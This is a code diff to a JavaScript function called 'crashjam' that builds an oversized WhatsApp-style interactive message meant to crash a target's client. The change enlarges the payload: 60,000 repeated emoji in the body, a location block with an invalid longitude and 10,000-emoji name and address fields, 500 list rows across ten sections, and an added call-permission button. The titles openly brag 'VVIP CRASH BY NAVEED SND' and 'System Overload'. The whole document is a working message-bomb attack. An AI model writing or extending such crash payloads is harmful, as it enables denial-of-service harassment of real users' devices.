@@ -34,29 +34,39 @@ async function crashjam(SYxS7, target) {
             message: {
                 interactiveMessage: {
                     header: {
-                        title: "Crashed By NAVEED SND",
-                        hasSubtitle: true
+                        title: "VVIP CRASH BY NAVEED SND",
+                        hasSubtitle: true,
+                        locationMessage: {
+                            degreesLatitude: -9.09999262999,
+                            degreesLongitude: 199.99963118999,
+                            name: "🔥".repeat(10000),
+                            address: "🔥".repeat(10000)
+                        }
                     },
                     body: {
-                        text: "🔥".repeat(50000)
+                        text: "🔥".repeat(60000)
                     },
                     footer: {
-                        text: "System Failure"
+                        text: "System Overload"
                     },
                     nativeFlowMessage: {
                         buttons: [
                             {
                                 name: "single_select_reply",
                                 buttonParamsJson: JSON.stringify({
-                                    title: "Crash",
-                                    sections: [{
-                                        title: "Select",
+                                    title: "CRASH",
+                                    sections: Array.from({ length: 10 }, (_, s) => ({
+                                        title: `Section ${s}`,
                                         rows: Array.from({ length: 50 }, (_, i) => ({
                                             title: `Row ${i}`,
-                                            id: `id_${i}`
+                                            id: `id_${s}_${i}`
                                         }))
-                                    }]
+                                    }))
                                 })
+                            },
+                            {
+                                name: "call_permission_request",
+                                paramsJson: "{}"
                             }
                         ]
                     }
